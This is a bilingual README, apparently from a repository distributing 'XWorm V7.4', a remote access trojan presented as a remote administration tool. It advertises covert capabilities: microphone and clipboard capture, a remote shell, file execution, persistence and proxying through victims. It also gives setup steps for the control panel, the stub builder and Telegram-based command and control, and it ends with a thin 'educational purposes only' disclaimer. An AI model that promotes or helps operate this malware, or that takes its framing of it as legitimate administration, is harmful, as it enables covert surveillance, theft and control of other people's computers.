<div align="center">

# 🪱 XWorm V7.4

**Advanced Remote Administration Tool**

[![Version](https://img.shields.io/badge/version-7.4-blueviolet?style=for-the-badge&logo=github)](#)
[![Platform](https://img.shields.io/badge/platform-Windows%207%2F8%2F10%2F11-success?style=for-the-badge&logo=windows)](#)
[![.NET](https://img.shields.io/badge/.NET%20Framework-4.8-informational?style=for-the-badge&logo=csharp)](#)
[![License](https://img.shields.io/badge/license-Unlicense-red?style=for-the-badge)](#)

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=22&pause=1000&color=8A2BE2&center=true&vCenter=true&width=600&lines=Full+Remote+Access;Plugin+Ecosystem;Real-Time+Control" alt="Typing SVG" />

**🇬🇧 [English](#-overview) | 🇷🇺 [Русский](#-обзор)**

</div>

---

## 🖼️ Screenshots

<div align="center">

### 📦 Package Contents

<img src="screenshots/files.png" width="700" alt="Package contents"/>

### 🔐 Client Panel — Connection

<img src="screenshots/panel.png" width="320" alt="Client Panel"/>

</div>

---

## 🇬🇧 English

### ⚡ Overview

> XWorm is a compact yet powerful remote administration tool built on .NET Framework.
> Control remote machines in real-time through an intuitive client panel with
> full plugin extensibility and multiple connection methods.

### ✨ Core Features

| Feature | Description |
|---------|-------------|
| 🖥️ **Remote Desktop** | Live screen streaming with quality & FPS control |
| 📂 **File Manager** | Full two-way filesystem access, upload / download / execute |
| ⚙️ **Process Manager** | View & kill remote processes instantly |
| 💻 **Remote Shell** | Interactive CMD / PowerShell sessions |
| 🎙️ **Audio Capture** | Live microphone streaming |
| 📋 **Clipboard Monitor** | Real-time clipboard tracking |
| 🌐 **Reverse Proxy** | SOCKS5 proxy through client machines |
| 🔌 **Plugin System** | Load custom `.dll` plugins on demand |
| 🔄 **Persistence** | Multiple startup methods, scheduled tasks |
| 💬 **Message Box** | Send popup messages to clients |

### 🚀 Quick Start

```bash
# 1. Launch the client panel
XWorm V7.4.exe

# 2. Fill connection settings:
#    Lic  → your host or bot token
#    Port → connection port
#    Pass → encryption key

# 3. Press Start ✓

# 4. Open Builder tab → configure stub → deploy
```

### 🔧 Configuration

<details>
<summary><b>TCP Mode</b></summary>

```json
{
  "Host": "your-host.com",
  "Port": 8833,
  "Key": "your-encryption-key"
}
```

</details>

<details>
<summary><b>Telegram Mode</b></summary>

```json
{
  "BotToken": "1234567890:ABCdef...",
  "ChatId": "123456789"
}
```

No dedicated server needed — control everything right from Telegram.

</details>

### 🗂️ Project Structure

```text
📦 XWorm-V7.4
 ┣ 📜 XWorm V7.4.exe      # Client panel + builder
 ┣ 📂 Plugins              # Extension modules
 ┣ 📂 ClientsFolder        # Files from clients
 ┣ 📂 Logs                 # Session logs
 ┣ 📂 Sounds               # Notification sounds
 ┣ 📄 GeoIP.dat            # IP geolocation database
 ┗ 🛠 Fixer V7.bat         # Performance counters fixer
```

### 🛠️ Troubleshooting

<details>
<summary><b>Panel doesn't start?</b></summary>

Run `Fixer V7.bat` **as Administrator** — it rebuilds Windows performance
counters required by .NET.

</details>

<details>
<summary><b>Clients don't connect?</b></summary>

- Check port forwarding if using WAN
- Verify firewall rules
- Make sure the key matches between builder and stub
- Try Telegram mode if direct connection is unavailable

</details>

---

## 🇷🇺 Русский

### ⚡ Обзор

> XWorm — компактный, но мощный инструмент удалённого администрирования на .NET Framework.
> Управляйте удалёнными машинами в реальном времени через интуитивную панель
> с полной поддержкой плагинов и разными способами подключения.

### ✨ Основные возможности

| Функция | Описание |
|---------|----------|
| 🖥️ **Удалённый рабочий стол** | Трансляция экрана с настройкой качества и FPS |
| 📂 **Файловый менеджер** | Полный доступ к файловой системе: загрузка / скачивание / запуск |
| ⚙️ **Диспетчер процессов** | Просмотр и завершение процессов на удалённой машине |
| 💻 **Удалённая оболочка** | Интерактивные сессии CMD / PowerShell |
| 🎙️ **Захват звука** | Прослушивание микрофона в реальном времени |
| 📋 **Монитор буфера обмена** | Отслеживание буфера обмена онлайн |
| 🌐 **Обратный прокси** | SOCKS5-прокси через клиентские машины |
| 🔌 **Система плагинов** | Подгрузка собственных `.dll` модулей на лету |
| 🔄 **Автозагрузка** | Несколько методов закрепления, планировщик задач |
| 💬 **Message Box** | Отправка всплывающих сообщений клиентам |

### 🚀 Быстрый старт

```bash
# 1. Запустите панель
XWorm V7.4.exe

# 2. Заполните параметры подключения:
#    Lic  → ваш хост или токен бота
#    Port → порт
#    Pass → ключ шифрования

# 3. Нажмите Start ✓

# 4. Вкладка Builder → настройте стаб → используйте
```

### 🔧 Настройка

<details>
<summary><b>Режим TCP</b></summary>

```json
{
  "Host": "ваш-хост.com",
  "Port": 8833,
  "Key": "ваш-ключ-шифрования"
}
```

</details>

<details>
<summary><b>Режим Telegram</b></summary>

```json
{
  "BotToken": "1234567890:ABCdef...",
  "ChatId": "123456789"
}
```

Выделенный сервер не нужен — управляйте прямо из Telegram.

</details>

### 🗂️ Структура проекта

```text
📦 XWorm-V7.4
 ┣ 📜 XWorm V7.4.exe      # Панель + билдер
 ┣ 📂 Plugins              # Модули расширений
 ┣ 📂 ClientsFolder        # Файлы с клиентов
 ┣ 📂 Logs                 # Логи сессий
 ┣ 📂 Sounds               # Звуки уведомлений
 ┣ 📄 GeoIP.dat            # База геолокации IP
 ┗ 🛠 Fixer V7.bat         # Чинилка счётчиков производительности
```

### 🛠️ Решение проблем

<details>
<summary><b>Панель не запускается?</b></summary>

Запустите `Fixer V7.bat` **от имени администратора** — он пересоздаёт счётчики
производительности Windows, необходимые для .NET.

</details>

<details>
<summary><b>Клиенты не подключаются?</b></summary>

- Проверьте проброс порта при работе через интернет
- Проверьте правила файрвола
- Убедитесь что ключ совпадает в билдере и стабе
- При недоступности прямого подключения попробуйте режим Telegram

</details>

---

## ⚠️ Disclaimer

<div align="center">

This software is provided **for educational purposes only**.
The author takes no responsibility for any misuse.
By downloading you agree to use it solely on systems you own or have permission to test.

*Данный материал предоставлен исключительно в образовательных целях.*

</div>

---

<div align="center">

**⭐ Star this repository if you find it useful!**

![Repo Size](https://img.shields.io/github/repo-size/user/xworm?style=flat-square&color=purple)
![Last Commit](https://img.shieldshields.io/github/last-commit/user/xworm?style=flat-square)
![Stars](https://img.shields.io/github/stars/user/xworm?style=social)

*Made with 💜*

</div>